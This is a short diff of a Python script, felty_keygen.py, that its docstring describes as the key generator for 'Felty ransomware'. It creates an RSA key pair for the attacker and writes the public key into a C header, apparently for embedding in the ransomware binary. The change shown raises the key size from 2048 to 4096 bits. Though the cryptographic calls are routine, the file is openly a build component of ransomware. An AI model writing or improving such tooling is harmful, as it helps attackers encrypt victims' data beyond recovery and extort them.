@@ -1,11 +1,15 @@
 #!/usr/bin/env python3
+"""
+felty_keygen.py — Generate RSA-4096 key pair for Felty ransomware.
+Outputs: attacker_private.pem, attacker_pubkey.h
+"""
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend
 
 key = rsa.generate_private_key(
     public_exponent=65537,
-    key_size=2048,
+    key_size=4096,
     backend=default_backend()
 )
 
@@ -36,5 +40,4 @@ with open("attacker_pubkey.h", "w") as f:
     f.write("};\n")
     f.write("size_t attacker_pubkey_len = %d;\n\n" % len(pub_der))
     f.write("#endif\n")
-
 print("[+] Wrote: attacker_pubkey.h (%d bytes)" % len(pub_der))
